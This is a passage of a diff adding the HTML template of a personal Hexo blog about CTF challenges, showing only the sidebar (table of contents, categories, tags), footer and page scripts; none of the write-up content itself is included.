27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>14</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        4
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        8
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">数据库初学者 😞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">Flask File Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.1.</span> <span class="toc-text">谈谈flask pin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">WeirdBash</span></a></li></ol></li></ol>
+  </div>
+</section>
+
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>Just For Test</p>
+  </div>
+</section>
+
+
+      <section class="widget-categories widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+      <span>CATEGORIES</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categories-list">
+      
+        <li class="categories-list-item">
+          <a href="/categories/ctfshow%E5%B9%B3%E5%8F%B0/">
+            ctfshow平台 (3)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E6%A0%A1%E9%99%A2%E8%B5%9B/">
+            校院赛 (2)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/buu%E5%B9%B3%E5%8F%B0/">
+            buu平台 (3)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/Web%E5%9F%BA%E7%A1%80/">
+            Web基础 (2)
+          </a>
+        </li>
+        
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/About-blog/" style="font-size: 10px;" class="tags-cloud-0">About blog</a> <a href="/tags/BUU/" style="font-size: 16.67px;" class="tags-cloud-7">BUU</a> <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/Misc/" style="font-size: 10px;" class="tags-cloud-0">Misc</a> <a href="/tags/SSTI/" style="font-size: 13.33px;" class="tags-cloud-3">SSTI</a> <a href="/tags/Upload/" style="font-size: 10px;" class="tags-cloud-0">Upload</a> <a href="/tags/Web/" style="font-size: 13.33px;" class="tags-cloud-3">Web</a> <a href="/tags/ctfshow/" style="font-size: 13.33px;" class="tags-cloud-3">ctfshow</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/ins0mn1a93/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">Ins0mn1a93</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  
+
+
+
+
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
